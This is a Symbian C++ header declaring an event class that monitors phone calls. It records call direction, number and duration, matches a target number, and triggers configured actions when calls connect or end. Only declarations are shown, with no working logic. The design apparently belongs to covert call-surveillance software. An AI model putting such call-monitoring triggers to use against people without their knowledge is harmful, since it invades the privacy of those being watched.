/*
 * EventCall.h
 *
 *  Created on: 06/ott/2010
 *      Author: Giovanna
 */

#ifndef EVENTCALL_H_
#define EVENTCALL_H_

#include "AbstractEvent.h"
#include "MonitorPhoneCall.h"

typedef struct TCallStruct 
	{
	TInt iExitAction;	// action triggered when call ends
	TInt iRepeatAction;
	TInt iIter;
	TInt iDelay;
	}TcallStruct;

/**
 *  CEventCall
 * 
 */
class CEventCall : public CAbstractEvent, public MCallMonCallBack
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CEventCall();

	/**
	 * Two-phased constructor.
	 */
	static CEventCall* NewL(const TDesC8& params, TUint32 aTriggerId);

	/**
	 * Two-phased constructor.
	 */
	static CEventCall* NewLC(const TDesC8& params, TUint32 aTriggerId);

protected:
	// From CAbstractEvent
	/**
	 * Events MUST implement this method to start their task.
	 */
	virtual void StartEventL();

private:
	// From MCallMonCallBack
	virtual void NotifyConnectedCallStatusL(CTelephony::TCallDirection aDirection,const TDesC& aNumber);
	virtual void NotifyDisconnectedCallStatusL();
	virtual void NotifyDisconnectingCallStatusL(CTelephony::TCallDirection aDirection, TTime aStartTime, TTimeIntervalSeconds aDuration, const TDesC& aNumber);
		
	TBool MatchNumber(const TDesC& aNumber);
	/**
	 * Constructor for performing 1st stage construction
	 */
	CEventCall(TUint32 aTriggerId);

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);
	
private:
	TCallStruct	iCallParams;
	TBuf<16>	iTelNumber;	
	TBool		iWasInMonitoredCall;
	
	CPhoneCallMonitor*	iCallMonitor;
	};



#endif /* EVENTCALL_H_ */
